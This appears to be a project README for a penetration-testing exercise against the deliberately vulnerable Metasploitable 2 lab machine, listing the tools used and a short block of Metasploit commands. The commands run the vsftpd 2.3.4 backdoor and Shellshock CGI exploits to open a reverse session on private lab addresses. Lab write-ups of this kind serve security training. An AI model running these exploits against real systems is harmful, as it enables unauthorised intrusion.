# Metasploitable 2 - VAPT Project

This repository documents a full Vulnerability Assessment and Penetration Testing (VAPT) process carried out against the intentionally vulnerable **Metasploitable 2** virtual machine.

## 🎯 Objective

To identify and exploit real-world vulnerabilities using professional penetration testing methodologies and tools such as **Nikto** and **Metasploit**, culminating in shell access and privilege escalation.

---

## 🛠️ Tools Used

- **Kali Linux (Attacker Machine)**
- Nmap (for port scanning and service version detection)
- **Nikto** – Web server vulnerability scanner
- **Metasploit Framework** – Exploitation and payload management

---

## 🎯 Objectives

- Identify vulnerable services
- Exploit known CVEs (Apache, FTP)
- Obtain shell access
- Attempt privilege escalation

## 📝 Key Metasploit Commands

- use exploit/unix/ftp/vsftpd_234_backdoor
- set RHOSTS 192.168.56.102
- run
- use exploit/multi/http/apache_mod_cgi_bash_env_exec
- set RHOSTS 192.168.56.102
- set TARGETURI /cgi-bin/test.cgi
- set LHOST 192.168.56.101
- run
- sessions -i 1
- whoami
- id



## 📷 Screenshots

| Screenshot | Description |
|------------|-------------|
| `nikto_results.png` | Vulnerabilities detected by Nikto |
| `metasploit_shell_access.png` | Gaining shell using Apache exploit |
| `meterpreter_session.png` | Meterpreter session opened |
| `privilege_escalation_attempt.png` | Attempt to escalate from www-data to root |

---

## 📄 Report

PDF write-up coming soon...

---

## ⚠️ Disclaimer

> This project was performed in a **legal, controlled lab environment** using Metasploitable 2 for educational purposes only.  
> Do not attempt these techniques on any system without **explicit permission**.

---
